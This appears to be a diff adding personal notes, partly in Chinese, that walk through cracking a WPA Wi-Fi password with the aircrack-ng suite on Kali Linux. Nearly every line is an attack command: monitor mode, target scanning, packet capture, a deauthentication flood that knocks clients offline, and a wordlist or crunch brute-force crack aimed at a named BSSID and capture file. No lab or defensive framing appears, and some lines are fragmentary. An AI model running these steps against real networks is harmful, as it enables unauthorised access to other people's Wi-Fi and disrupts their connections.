@@ -1,0 +1,23 @@
+vimgetinstall Aircrack.ng in kali
+
+开启无线网卡的monitor模式： 有些进程会影响到monitor模式的开启，使用下面这条命令结束受影响的进程
+airmon-ng check kill
+
+开启
+airmon-ng start wlan0
+
+使用如下命令扫描wifi热点，重点需要注意的属性已经用红色字体备注，重点需要记录目标wifi的CH 和BSSID两个属性。
+airodump-ng wlan0mon
+
+使用airodump-ng 工具抓包，命令格式如下：
+airodump-ng -c channel --bssid [bssid of wifi] -w [path to write the data of packets]   wlan0mon[interface]
+air
+使用aireplay-ng 泛洪攻击加速获取握手数据包
+aireplay-ng --deauth 10 -a [router bssid] wlan0 下线
+
+stop airmon-ng 
+
+airmon-ng stop wlan0mon
+
+aircrack-ng -b [bssid of router] -w [path to word list] [path to capture packets]   -w path to word list in my case it is ‘/root/Desktop/wordlist.txt’
+crunch 8 8 haibroo! -u | aircrack-ng -b 50:2B:73:F4:35:F1 /home/swm/hongjin-01.cap -w-
